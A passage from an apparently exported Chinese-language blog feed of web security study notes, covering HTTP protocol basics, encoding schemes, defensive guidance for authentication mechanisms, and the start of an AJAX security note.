<li>及时无法立即有效防止针对会话的蛮力攻击，但保留详细的日志并向管理员发出警报任然可帮助他们对攻击进行调查，并尽其所能采取适当的行动。</li>
<li>只要有可能，应向用户警告与会话有关的反常事件。</li>
</ol>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>会话</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP相关</title>
    <url>/2019/03/18/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/0.HTTP/</url>
    <content><![CDATA[<h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>HTTP(HyperText Transfer Protocol, 超文本传输协议)是访问万维网使用的核心通信协议。也是今天所有Web应用程序使用的通信协议。最初，HTTP只是一个为获取基于文本的静态资源而开发的简单协议，后来人们以各种形式扩展和利用它，时期能够支持如今常见的复杂分布式应用程序。</p>
<p>HTTP使用一种基于消息的模型：客户端送出一条请求消息，而后由服务器返回一条响应消息。该协议基本上不需要连接，虽然HTTP使用有状态的TCP协议作为它的传输机制，但每次请求与响应交换都自动完成，并且可能使用不同的TCP连接。</p>
<h2 id="HTTP-请求"><a href="#HTTP-请求" class="headerlink" title="HTTP 请求"></a>HTTP 请求</h2><p>所有HTTP消息（请求与响应）中都包含一个或几个单行显示地消息头（header），然后是一个强制空白行，最后是消息主体（可选）。以下是一个典型的HTTP请求：</p>
<p>GET /auth/488/YourDetails.ashx?uid=129 HTTP/1.1</p>
<p>Accept: application/x-ms-application, image/jpeg, application/xaml+xml</p>
<p>Referer: <a href="https://XXX" target="_blank" rel="noopener">https://XXX</a></p>
<p>Accept-Language: en-GB</p>
<p>User-Agent: XXXX</p>
<p>Accept-Ecoding: gzip</p>
<p>Host: mdsec.net</p>
<p>Connection: Keep-Live</p>
<p>Cookid: SessionId=xxxxx</p>
<p>每个HTTP请求的第一行都由以3个空格间隔的项目组成。</p>
<ul>
<li>一个说明HTTP方法的动词。最常用的方法为GET，它的主要作用是从Web服务器获取一个资源。GET 请求并没有消息主题，因此在消息头后的空白行中没有其他数据。</li>
<li>所请求的URL。该URL通常由所请求的资源名称，以及一个包含客户端向该资源提交的参数的可选查询字符串组成。在该URL中，查询字符串以？字符标识</li>
<li>使用的HTTP版本。</li>
<li>Referer消息头用于表示发出请求的原始URL。</li>
<li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息。</li>
<li>Host消息头用于指定出现在被访问的完整URL中的主机名称。如果几个Web站点以相同的一台服务器为主机，就需要使用Host消息头。</li>
<li>Cookie消息头用于提交服务器向客户端发布的其他参数。</li>
</ul>
<h2 id="HTTP响应"><a href="#HTTP响应" class="headerlink" title="HTTP响应"></a>HTTP响应</h2><p>以下是一个典型的HTTP响应：</p>
<p>HTTP/1.1 200 OK </p>
<p>Date: Tue, 19, Apr 2011 09:23:12 GMT</p>
<p>Server: Microsoft-IIS/6.0</p>
<p>X-Powered-By: ASP.NET</p>
<p>Set-Cookie: tracking=dddd</p>
<p>X-AspNet-Version: 2.0.44</p>
<p>Cache-Control: no-cache</p>
<p>Pragma: no-cache</p>
<p>Expires: Tue, 01, Jan 1970 00:00:00 GMT</p>
<p>Content-Type: text/html</p>
<p>Content-Length: 1078</p>
<!xasdasd><p>dsddasda&lt;/&gt;</p>
<p>每个HTTP响应的第一行由3个以空格间隔的项目组成。</p>
<ul>
<li>使用的HTTP版本</li>
<li>表示请求结果的数字装填。</li>
<li>一段以文本形式的“原因短语”，进一步说明响应状态</li>
</ul>
<h2 id="HTTP方法"><a href="#HTTP方法" class="headerlink" title="HTTP方法"></a>HTTP方法</h2><ul>
<li>GET方法的作用在于获取资源。它可以用与URL查询字符串的形式向所请求的资源发送参数。这是用户可将一个包含动态资源的URL标注为书签。</li>
<li>POST方法主要作用是执行操作。使用这个方法可以在URL查询字符串与消息主体中发送请求参数。</li>
<li>HEAD方法功能与GET方法类似，不同之处在于服务器不会再起响应中返回消息主体。服务器返回的消息头应与对应的GET请求的消息头相同。</li>
<li>TRACE方法主要用于诊断。服务器应在响应主体中返回其受到的请求消息的具体内容。这种方法可用于检测客户端与服务器之是否存在任何操纵请求的代理服务器。</li>
<li>OPTIONS方法要求服务器报告对某一特殊资源有效的HTTP方法。服务器通常返回一个包含ALLOW消息头的响应，并在其中列出所有有效的方法。</li>
<li>PUT方法视图使用包含在请求主体中的内容，向服务器上传指定的资源。</li>
</ul>
<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p>URL（Uniform Resource Location，统一资源定位符）是表示Web资源的唯一标识符，通过它即可获取其表示的资源。最常用的URL格式如下：</p>
<p><strong>protocol://hostname[:port]/[path/]file[?parameter=value]</strong></p>
<p>这个结构中有几个部分是可选的。如果端口号与相关协议使用的默认值不同，则只包含端口号即可。</p>
<h2 id="REST"><a href="#REST" class="headerlink" title="REST"></a>REST</h2><p>表述性状态转移（REST）设计分布式系统的一种体系架构，在这类体系架构中，请求和响应包含系统资源当前状态的表示。</p>
<h2 id="HTTP消息头"><a href="#HTTP消息头" class="headerlink" title="HTTP消息头"></a>HTTP消息头</h2><p>HTTP支持许多不同的消息头，其中一些专用于特殊用途。一些消息头可用在请求与响应中，而其他一些消息头只能专门用在某个特定的消息中。</p>
<h3 id="常用消息头"><a href="#常用消息头" class="headerlink" title="常用消息头"></a>常用消息头</h3><ul>
<li>Connection：这个消息头用于高速通信的另一端，在完成HTTP传输后是关闭TCP连接还是保持连接开放以接受其他消息。</li>
<li>Content-Encoding：这个消息头为消息主体的内容指定编码形式，一些应用程序使用它来压缩响应以加快传输速度。</li>
<li>Content-Length：这个消息头用于规定消息主体的字节长度。（HEAD语法的响应例外，它在对应的GET请求的响应中指出主体的长度）。</li>
<li>Content-Type：用于规定消息主体的内容类型。</li>
<li>Transfer-Encoding：指定为为方便其通过HTTP传输而对消息主体使用的任何编码。如果使用这个消息头，通常用它指定块编码。</li>
</ul>
<h3 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h3><ul>
<li>Accept：用于高速服务器客户端愿意接受哪些内容。</li>
<li>Accept-Encoding：用于告诉服务器，客户端愿意接受哪些内容编码。</li>
<li>Authorization：用于为一种内置HTTP身份向服务器提交证书。</li>
<li>Cookie：用于向服务器提交它以前发布的Cookie</li>
<li>Host：用于指定出现在所请求的完整URL中的主机名称。</li>
<li>If-Modified-Since：用于说明浏览器最后一次受到所请求的资源的时间。如果自那以后资源没有发生变化，服务器就会发出一个带状态码的304响应，指示客户端使用资源的缓存副本。</li>
<li>If-None-Match：用于制定一个实体标签。实体标签是一个说明消息主体内容的标识符。当最后一次受到所请求的资源时，浏览器提交服务器发布的实体标签。服务器可以使用实体标签确定浏览器是否使用资源的缓存副本。</li>
<li>Origin：用在跨域Ajax请求中，用于指示提出请求的域。</li>
<li>Referer：用于指示提出当前请求的原始URL</li>
<li>User-Agent：提供与浏览器或生成请求的其他客户端软件有关的信息。</li>
</ul>
<h3 id="响应消息头"><a href="#响应消息头" class="headerlink" title="响应消息头"></a>响应消息头</h3><ul>
<li>Access-Control-Allow-Origin：用于指示是否可通过跨域Ajax请求获取资源。</li>
<li>Cache-Control：用于向浏览器传送缓存指令。</li>
<li>ETag：用于指定一个实体标签。客户端可在将来的请求中提交这个标识符，火哥和If-Non-Match消息头中相同的资源，通知服务器浏览器当前缓存中保存的是那个版本的资源。</li>
<li>Expires：用于向浏览器说明消息主体内容的有效时间，在这个时间之前，浏览器可以使用这个资源的缓存副本。</li>
<li>Location：用于在重定向响应中说明重定向的目标。</li>
<li>Pragma：用于向浏览器传送缓存指令。</li>
<li>Server：提供所使用的的Web服务器软件的相关信息。</li>
<li>Set-Cookie：用于向浏览器发布Cookie，浏览器会在随后的请求中将其返回给服务器。</li>
<li>WWW-Authenticate：用在带401的状态码响应中，提供与服务器所支持的身份验证类型有关的信息。</li>
<li>X-Frame-Options：指示浏览器框架是否及如何加载当前响应。</li>
</ul>
<h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>Cookie是大多数Web应用程序所依赖的HTTP协议的一个关键组成部分，攻击者常常通过它来利用Web程序中的漏洞。服务器使用cookie机制向客户端发送数据，客户端保存cookie并将其返回给服务器。</p>
<p>Cookie一般由一个名/值对构成，但也可以包含任何不含空格的字符串。可以在服务器响应中使用几个Set-Cookie消息头发布多个Cookie，并可在同一个Cookie消息头中用逗号分隔不同的Cookie，将它们全部返回给服务器。</p>
<p>去除Cookie的实际值之外，Set-Cookie消息头还可以包含以下任何可选属性，用它们控制浏览器处理Cookie 的方式。</p>
<ul>
<li>expires：用于设定Cookie的有效时间。这样会使浏览器将Cookie保存在永久性的存储器中，在随后的浏览器会话中重复利用，直到到期时间为止。如果没有设定这个属性，那么Cookie仅用在当前浏览器会话中。</li>
<li>domain：用于指定Cookie的有效域。这个域必须和受到Cookie的域相同，或者是它的父域。</li>
<li>path：要几个与指定Cookie的有效URL路径。</li>
<li>secure：如果设置这个属性，则仅在HTTPS请求中提交Cookie。</li>
<li>HttpOnly：如果设置这个属性，将无法通过客户端JavaScript直接访问Cookie.</li>
</ul>
<h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><p>每条HTTP响应消息都必须在第一行中包含一个状态码，说明请求的结果。状态码可以分成以下5类：</p>
<ul>
<li>1xx-提供信息</li>
<li>2xx-请求被成功提交</li>
<li>3xx-客户端被重定向到其他资源</li>
<li>4xx-请求包含某种错误</li>
<li>5xx-服务器执行请求时遇到错误。</li>
</ul>
<h3 id="常见的状态码"><a href="#常见的状态码" class="headerlink" title="常见的状态码"></a>常见的状态码</h3><ul>
<li>100 Continue：当客户端提交一个包含主体的请求时，将发送这个响应。该响应表示已经收到请求消息头，客户端应继续发送主体。请求完成后，再由服务器返回另一个响应。</li>
<li>200 OK。表示已成功提交请求，且响应主体包含请求结果。</li>
<li>201 Created：PUT请求的响应返回这个状态码，表示请求已成功提交。</li>
<li>301 Moved Permanently：本状态码将浏览器永久重定向到另外一个在Location消息头中指定的URL。以后客户端应使用新URL替换原始URL。</li>
<li>302 Found：本状态码将浏览器暂时重定向到另外一个在Location消息头中指定的URL。客户端应在随后的请求中恢复使用原始URL。</li>
<li>304 Not Modified：本状态码指示浏览器使用缓存中保存的所请求资源的副本。服务器使用If-Modified-Since与If-None-Match消息头确定客户端是否拥有最新版本的资源。</li>
<li>400 Bad Request：本状态码表示客户端提交了一个无效的HTTP请求。当以某种无效的方式修改请求时，可能会遇到这个错误码。</li>
<li>401 Unauthorized：服务器在许可请求前要求HTTP进行身份验证。WWW-Authenticate消息头详细说明所支持的身份验证类型。</li>
<li>403 Forbidden：本状态码之处，不管是否通过身份验证，禁止任何人访问被请求的资源。</li>
<li>404 Not Found：本状态码表示所请求的资源并不存在。</li>
<li>405 Method Not Allowed：本状态码表示指定的URL不支持请求中使用方法。</li>
<li>413 Request Entity Too Large：如果在本地代码中探查缓冲器溢出漏洞并就此提交超长数据串，则本状态码表示请求主体过长，服务器无法处理。</li>
<li>414 Request URI Too Long：与前一个响应类似，本状态码表示请求中的URL过长，服务器无法处理。</li>
<li>500 Internal Server Error：本状态码表示服务器在执行请求时遇到错误。当提交无法预料的输入、在应用程序处理过程中造成无法处理的错误时，通常会受到本状态码。</li>
<li>503 Service Unavailable：通常，本状态码表示尽管Web服务器运转正常，并且能够响应请求，但服务器访问的应用程序还是无法做出响应。</li>
</ul>
<h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTP使用普通的非加密TCP作为其传输机制，因此，处在网络适当位置的攻击能够截取这个机制。HTTPS本质上与HTTP一样，都属于应用层协议，但HTTPS通过安全传输机制-安全套接层-传输数据。这种机制可保护通过网络传送的所有数据的隐秘性和完整性，显著降低非入侵式拦截攻击的可能性。不管是否使用SSL进行传输，HTTP请求与响应都以完全相同的方式工作。</p>
<h2 id="HTTP代理"><a href="#HTTP代理" class="headerlink" title="HTTP代理"></a>HTTP代理</h2><p>HTTP代理服务器是一个协调客户端与目标Web服务器之间访问的服务器。当配置浏览器使用代理服务器时，它会将所有请求提交到代理服务器，代理服务器再将请求转发给相关Web服务器，并将响应返回给浏览器。大多数代理还使用其他服务，如缓存，验证与访问控制。值得注意的是，如果使用代理服务器，HTTP的工作机制会出现两方面的差异。</p>
<ul>
<li>当浏览器向代理服务器发布HTTP请求时，它会将完整的URL（包括协议前缀http://与服务器主机名称，在非标准URL中，还包括端口号）插入请求中。代理服务器将提取主机名称和端口，并使用这些信息将请求指向正确的目标的Web服务器。</li>
<li>当使用HTTPS时，浏览器无法与代理服务器进行SSL握手，因为这样做会破坏安全隧道，使通信易于遭受拦截攻击。因此，浏览器必须将代理作为一个纯粹的TCP级中继，由它传递浏览器与目标Web浏览器之间的所有网络数据，并与浏览器进行正常的SSL握手。浏览器使用CONNECT方法向代理服务器提交一个HTTP请求，并制定URL中的目标主机名称与端口号，从而建立这种中继。如果代理允许该请求，它会返回一个含200状态码的HTTP响应，一直开放TCP连接，从此以后作为目标服务器的纯粹TCP级中继。</li>
</ul>
<p>从某种程度上说，攻击Web应用程序时最有用的工具是一个处在浏览器与目标Web站点之间的专用代理服务器，使他可以拦截并修改所有使用HTTPS的请求与响应。</p>
<h2 id="HTTP身份验证"><a href="#HTTP身份验证" class="headerlink" title="HTTP身份验证"></a>HTTP身份验证</h2><p>HTTP拥有自己的身份验证机制，使用不同的身份验证方案。</p>
<ul>
<li>Basic。这是一种非常简单的身份验证机制，它在请求消息头中随每条消息以Base64编码字符串形式发送用户证书。</li>
<li>NTLM。这是一种质询-响应式机制，他使用某个Windows NTLM协议版本。</li>
<li>Digest。这是一种质询-响应式机制，它随同用户证书一起使用一个随机值MD5校验和。</li>
</ul>
<h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><p>同源策略是浏览器实施的一种关键机制，主要用于防止不同来源的内容相互干扰。基本上，从一个网站受到的内容可以读取并修改从该站点收到的其他内容，但不得访问从其他站点受到的内容。</p>
<p>如果不使用同源策略，那么当不知情的用户浏览到某个恶意网站时，在该网站上运行的脚本代码能够访问这名用户同时访问的任何其他网站的数据和功能。这样，该恶意站点就可以从用户的网上银行转账、阅读用户的Web邮件，火灾用户网上购物时拦截它的信用卡信息。为此，浏览器实施限制，只允许相同来源的内容进行交互。</p>
<p>关于同源策略，需要了解的一些主要特点如下：</p>
<ul>
<li>位于一个域中的页面可以向另一个域提出任意数量的请求。但该页面本身无法处理上述请求返回的数据。</li>
<li>位于一个域中的页面可以加载来自其他域中的脚本并在自己的域中执行这个脚本。这是因为脚本被假定为包含代码，而非数据，因此跨域访问并不会泄露任何敏感信息。</li>
<li>位于一个域中的页面无法读取或修改属于另一个域的Cookie或者其他DOM数据。</li>
</ul>
<h1 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h1><h2 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h2><p>URL只允许使用US-ASCII字符集中的可打印字符（也就是ACSII代码在0x20和0x7e范围内的字符）。而且，由于其在URL方案或HTTP协议内具有特殊含义，这个范围内的一些字符也不能用在URL中。</p>
<p>URL编码方案主要用于对扩展ASCII字符集中任何有问题的字符进行编码，使其可通过HTTP安全传输。任何URL编码的字符都以%为前缀，其后是这个字符的两位十六进制ASCII代码。</p>
<p>以下是一些常见的URL编码字符：</p>
<ul>
<li>%3d表示=</li>
<li>%25表示%</li>
<li>%20表示空格</li>
<li>%0a表示新行</li>
<li>%00表示空字节</li>
</ul>
<p>另一个指的注意的编码字符是加号（+），它代表URL编码的空格（除%20代表空格外）。</p>
<h2 id="Unicode编码"><a href="#Unicode编码" class="headerlink" title="Unicode编码"></a>Unicode编码</h2><p>Unicode是一种为支持全世界所使用的的各种编写系统二十几的字符编码标准，它采用各种编码方案，其中一些课用于表示Web应用程序中的不常见字符。</p>
<p>16位Unicode编码的工作原理和URL编码类似。为通过HTTP进行传输，16位的Unicode编码的字符以%u为前缀，其后是这个字符的十六进制unicode码点。</p>
<p>UTF-8是一种长度可变的编码标准，它使用一个或几个字节表示每个字符。为通过HTTP进行传输，UTF-8编码的多字节字符以%为前缀，其后用十六进制表示每个字节。</p>
<p>攻击Web应用程序时之所以要用到Unicode编码，主要在于有时可用它来破坏输入确认机制。如果输入过滤组织了某些恶意表达式，但随后处理输入的组件识别Unicode 编码，就可以使用各种标准与畸形Unicode编码避开过滤。    </p>
<h2 id="HTML编码"><a href="#HTML编码" class="headerlink" title="HTML编码"></a>HTML编码</h2><p>HTML编码是一种用于表示问题字符以将其安全并入HTML文档的方案。有许多字符具有特殊的含义，并被用于定义文档结构而非其内容。为了安全使用这些字符并将其用在文档内容中，就必须对其进行HTML编码。</p>
<p>此外，任何字符都可以使用它的十进制ACII码进行HTML编码，或者使用十六进制的ASCII码。</p>
<p>当攻击Web应用程序时，HTML编码主要在探查跨站点脚本漏洞时发挥作用。如果应用程序在响应中返回未被修改的用户数据，那么它可能易于受到攻击；但是，如果它对危险字符进行HTML编码，也许比较安全。</p>
<h2 id="Base64编码"><a href="#Base64编码" class="headerlink" title="Base64编码"></a>Base64编码</h2><p>Base64编码仅用一个可打印的ASCII字符就可安全转换任何二进制数据，它常用于对电子邮件附件进行编码，使其通过SMTP安全传输。它还可用于在基本HTTP验证机制中对用户整数进行编码。</p>
<p>Base64编码将输入数据转换成3个字节块。每个块被划分为4端，每段6个数据位。这6个数据位有64种不同的排列，因此每个段可使用一组64个字符标识。Base64、使用以下字符集，其中只包含可打印的ASCII字符：</p>
<p><strong>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</strong></p>
<p>如果最后的输入数据块不能构成3段数据输出，就用一个或者两个等号（=）补足输出。</p>
<h2 id="十六进制编码"><a href="#十六进制编码" class="headerlink" title="十六进制编码"></a>十六进制编码</h2><p>许多应用程序在传送二进制数据时直接使用十六进制编码，用ASCII字符表示十六进制数据块。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击验证机制</title>
    <url>/2019/03/18/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/1.%E6%94%BB%E5%87%BB%E9%AA%8C%E8%AF%81%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h1 id="验证机制"><a href="#验证机制" class="headerlink" title="验证机制"></a>验证机制</h1><h2 id="保障验证机制的安全"><a href="#保障验证机制的安全" class="headerlink" title="保障验证机制的安全"></a>保障验证机制的安全</h2><h3 id="使用可靠的证书"><a href="#使用可靠的证书" class="headerlink" title="使用可靠的证书"></a>使用可靠的证书</h3><ul>
<li>应强制执行适当的最小密码要求。这些要求包括：最小密码长度，使用字母、数字和排版字符，同时使用大、小写字符，避免使用字典中的单词、名称和其他常见密码。避免以用户名为密码，避免使用和以前的密码相似或完全相同的密码</li>
<li>应使用唯一的用户名</li>
<li>系统生成的任何用户名和密码应具有足够的随机性，其中不包含任何顺序，及时攻击者访问大量练习生成的实例也无法对其预测。</li>
<li>允许用户设置足够强大的密码。</li>
</ul>
<h3 id="安全处理证书"><a href="#安全处理证书" class="headerlink" title="安全处理证书"></a>安全处理证书</h3><ul>
<li>应以不会造成非授权泄露的方式创建、保存和传送所有证书</li>
<li>应使用公认的加密技术（SSL）保护客户端与服务器间的所有通信。既无必要也不需要使用定制解决方案保护传输中的数据。</li>
<li>如果认为最好在应用程序的不需验证的区域使用HTTP，必须保证使用HTTPS加载登录表单，而不是在提交登录信息时才转换到HTTPS。</li>
<li>只能使用POST请求向服务器传输证书。绝不能讲证书放在URL参数或cookie中。决不能将整数返还给客户端，即使通过重定向参数也不行。</li>
<li>所有服务器-客户端应用程序组件应这样保存证书：即使攻击者能够访问应用程序数据库中存储的所有相关数据，它们也无法轻易恢复证书的原始值。达到这种目的的最常用的方法是使用强大的散列函数，并对其进行“加salt处理”以降低预先计算的离线攻击的危害。该sale应特定于拥有密码的账户，以防止攻击者重播或替换散列值。</li>
<li>一般来说，客户端“记住我”功能应仅记忆如用户名之类的非保密数据。在安全要求较低的应用程序中，可适当允许用户选择一种工具来记住密码。在这种情况下，客户端不应保存明文证书。</li>
<li>应使用一种密码修改工具，要求用户定期修改其密码</li>
<li>如果以非正常交互的形式向新建账户分配证书，应以尽可能安全的形式传送证书，并设置时间限制，要求用户在第一次登陆时修改证书，并告诉用户在初次使用后销毁通信通道。</li>
</ul>
<h3 id="正确确认证书"><a href="#正确确认证书" class="headerlink" title="正确确认证书"></a>正确确认证书</h3><ul>
<li>应确认完整密码。也就是说，区分大小写，不过滤或修改任何字符，也不截断密码。</li>
<li>应用程序应在登陆处理过程中主动防御无法预料的事件。例如，根据所使用的开发语言，应用程序应对所有API调用使用“全捕获”型异常处理程序。这些程序应明确删除用于控制登录状态的所有会话和方法内部数据，并使当前会话完全失效。因此，及时攻击者以某种方式避开验证，也会被服务器强制退出。</li>
<li>应对验证逻辑的伪代码和实际的应用程序源代码进行仔细的代码审查，以确定故障开放条件之类的逻辑错误。</li>
<li>如果应用程序执行支持用户伪装功能，应严格控制这种功能，以防止攻击者滥用它获得未授权访问。鉴于这种功能的危险程序，通常有必要从面向公众的应用程序中彻底删除该功能，只对内部管理用户开放该功能，而且他们使用伪装也应接受严格控制与审核。</li>
<li>应对多阶段登录进行严格控制，以防止攻击者破幻登录阶段之间的转换和关系。<ul>
<li>有关登录极端进展和前面验证任务结果的所有数据应保存在服务器端会话对象中，绝不可传送给客户端或由其读取</li>
<li>禁止用户多次提交一项登录信息；禁止用户修改已经被收集或确认的数据。如果需要在几个阶段使用同一个数据，应在第一次收集时将该数据保存在会话变量中，随后从此处引用该数据。</li>
<li>在每一个登录阶段，应首先合适前面的阶段均已顺利完成。如果发现前面的阶段没有完成，应立即将验证尝试标记为恶意尝试</li>
<li>为防止泄露的是哪个登录阶段失败的信息，即使用户无法正确完成前面的阶段，即使最初的用户名无效，应用程序也应总是处理完所有的登录阶段。在处理完所有的登录阶段后，应用程序应在最后阶段结束时呈现一条常规“登录失败”消息，并且不提供失败位置的任何信息</li>
</ul>
</li>
<li>如果在登录过程中需要回答一个随机变化的问题，请确保攻击者无法选择回答问题、<ul>
<li>总是采用一个多阶段登录哦过程，在第一阶段确认用户身份，并在后面的阶段向用户提出随机变化的问题。</li>
<li>如果已向某一用户提出一个特定的问题，将该问题保存在永久性用户资料中，确保每次该用户尝试登录时，向其提出相同的问题，知道该用户正确回答这个问题。</li>
</ul>
</li>
<li>如果向某个用户提出一个随机变化的质询，将提出的问题保存在服务器端会话变量而非HTML表单的隐藏字段中，并根据保存的问题核实用户随后提供的答案。</li>
</ul>
<h3 id="防止信息泄露"><a href="#防止信息泄露" class="headerlink" title="防止信息泄露"></a>防止信息泄露</h3><ul>
<li>应用程序使用各种验证机制不应通过公开的或者通过从应用程序的其他行为进行推断，来解释关于验证参数的任何信息。攻击者应无法判断是提交的哪个参数造成了问题。</li>
<li>应由单独一个代码组件使用一条常规消息负责响应所有失败的登录尝试。这样做可避免由不同代码路径返回的本应不包含大量信息的消息，因为消息排版方面的差异，不同的HTTP状态码、其他隐藏在HTML中的信息等内容而让攻击者看出差别，从而产生一个细微的漏洞。</li>
<li>如果应用程序实行某种账户锁定以防止蛮力攻击，应小心处理以防造成信息泄露。</li>
<li>如果应用程序支持自我注册， 那么他能够以两种方式防止这种功能被用于美剧现有用户名。<ul>
<li>不允许自我选择用户名，应用程序可谓每个新用户建立一个唯一的用户名，防止应用程序披露表名一个选定的用户名已经存在的信息。</li>
<li>应用程序可以使用电子邮件作为用户名。</li>
</ul>
</li>
</ul>
<h3 id="防止蛮力攻击"><a href="#防止蛮力攻击" class="headerlink" title="防止蛮力攻击"></a>防止蛮力攻击</h3><ul>
<li>必须对验证功能执行的各种质询采取保护措施，防止攻击者企图使用自动工具响应这些质询。这包括登录机制、修改密码功能和恢复遗忘密码等功能中的质询。</li>
<li>使用无法预测的用户名，同时阻止用户名美枚举，给完全盲目的蛮力攻击设置巨大障碍，并要求攻击者在实施攻击前已经通过某种方式发现一个或几个特殊的用户名。</li>
<li>一些对安全性要求极高的应用程序在检测到少数几次登录失败后应立刻禁用该账户，并要求账户所有者采取各种非常规步骤重新激活该账户。</li>
<li>如果采用临时攻讦账户的策略，应采取措施确保这种策略的效率。<ul>
<li>为防止信息泄露导致用户名枚举，应用程序决不能投罗任何账户冻结信息。相反，应用程序应对一些列即使是使用无效用户名发起的失败登录做出响应，通过一条常规消息提出警告：如果出现多次登录失败，账户将被冻结，建议用户稍后再试。</li>
<li>应用程序不应向用户透露账户锁定标准。</li>
<li>如果一个账户被冻结，那么应用程序不用检查用户证书， 直接就可以拒绝该账户的登录尝试。</li>
<li>账户锁定之类的常规应对措施对防御一种极其有效的蛮力攻击并没有帮助，即遍历大量枚举出的用户名，检查单独一个脆弱密码，如password。例如，如果5次登录失败就会触发账户冻结，这意味着攻击者能够对每个账户尝试使用4个不同的密码，而不会引起任何中断。如果一个应用程序使用许多脆弱密码，使用上述攻击手段的攻击者就能攻破许多账户。</li>
</ul>
</li>
</ul>
<h3 id="防止滥用密码修改功能"><a href="#防止滥用密码修改功能" class="headerlink" title="防止滥用密码修改功能"></a>防止滥用密码修改功能</h3><ul>
<li>应用程序应始终执行密码修改功能，允许定时使用的密码到期终止，并允许用户修改密码。<ul>
<li>只能从已通过验证的会话中访问该功能</li>
<li>不应以任何方式直接提供用户名，也不能通过隐藏表单字段或cookie提供用户名。用户企图修改他人密码的行为属非法行为。</li>
<li>作为一项高级防御措施，应用程序应对密码修改功能加以保护，防止攻击者通过其他安全缺陷获得未授权的访问。为达到这种目的，应要求用户重新输入现有密码。</li>
<li>为防止错误，新密码应输入两次。应用程序应首先比较“新密码”与“确认新密码”字段，看他们是否匹配，如果不相匹配，返回一条详细的错误信息。</li>
<li>该功能应组织可能针对主要登录机制的各种攻击：应使用一条常规错误消息告知用户现有证书中出现的任何错误；如果修改密码的尝试出现少数几次失败，应临时冻结该动能。</li>
<li>应使用非常规方式（如电子邮件）通知用户其密码已被修改，但通知消息中不得包括用户的旧证书或者新证书</li>
</ul>
</li>
</ul>
<h3 id="防止滥用账户恢复功能"><a href="#防止滥用账户恢复功能" class="headerlink" title="防止滥用账户恢复功能"></a>防止滥用账户恢复功能</h3><ul>
<li>当用户遗忘密码时，许多安全性至关重要的应用程序，通过非常规方式完成账户恢复：用户必须给呼叫中心打电话并回答一系列安全问题；新证书或重新激活代码也以非常规方式送往用户注册的家庭住址。绝大多数应用程序并不需要这种程度的安全保护，只需使用自动恢复功能即可。</li>
<li>精心设计的密码恢复机制需要放置账户被未授权方攻破，避免给和发扬用户造成任何使用中断。</li>
<li>绝对不要使用密码“暗示”之类的特性，因为攻击者可利用明显的暗示向账户发动攻击。</li>
<li>通过电子邮件给用户发送一个唯一的、具有时间限制的、无法猜测的一次性恢复URL是帮助用户重新控制账户的最佳自动化解决方案。</li>
<li>为进一步防止未授权访问，应用程序可能会向用户提出一个次要质询，用户必须在使用密码重设功能前完成该质询。</li>
</ul>
<h3 id="日志、监控与通知"><a href="#日志、监控与通知" class="headerlink" title="日志、监控与通知"></a>日志、监控与通知</h3><ul>
<li>应用程序应在日志中记录所有与验证有关的事件，包括登录、退出、密码修改、密码重置、账户冻结与账户恢复。应当在适当的地方记录所有失败与成功的登录尝试。日志中应该包含一切相关细节，但不得泄露任何安全机密。应用程序应为日志提供强有力的保护以防止未授权的方位，因为它们是信息泄露的主要源头。</li>
<li>应用程序的实时劲爆与入侵防御功能应对验证过程中的异常事件进行处理。</li>
<li>应以非常规方式向用户通报任何重大的安全事件</li>
<li>应以非常规方式向用户通报经常发生的安全事件。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>验证</tag>
      </tags>
  </entry>
  <entry>
    <title>Access Control</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/2.Access_Control/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Access Control</tag>
      </tags>
  </entry>
  <entry>
    <title>Abuse_case</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/1.Abuse_case/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Abuse case</tag>
      </tags>
  </entry>
  <entry>
    <title>AJAX安全</title>
    <url>/2019/03/15/%E5%AE%89%E5%85%A8/OWSAP/0.AJAX_SERICUTY/</url>
    <content><![CDATA[<h1 id="AJAX安全"><a href="#AJAX安全" class="headerlink" title="AJAX安全"></a>AJAX安全</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本文档将为AJAX安全提供一个起点，希望后面可以根据特性的框架和技术进行合理地更新和扩展</p>
<h3 id="客户端（JavaScript）"><a href="#客户端（JavaScript）" class="headerlink" title="客户端（JavaScript）"></a>客户端（JavaScript）</h3><h4 id="使用-innerText-而不是-innerHtml"><a href="#使用-innerText-而不是-innerHtml" class="headerlink" title="使用.innerText 而不是.innerHtml"></a>使用.innerText 而不是.innerHtml</h4><p>.innerText通过编码向其传入的字符串，可以预防大部分的XSS问题。</p>
<h4 id="不要使用eval"><a href="#不要使用eval" class="headerlink" title="不要使用eval"></a>不要使用eval</h4><p>eval() 方法不可取，永远不要使用它。使用了它就代表着你的设计有问题。</p>
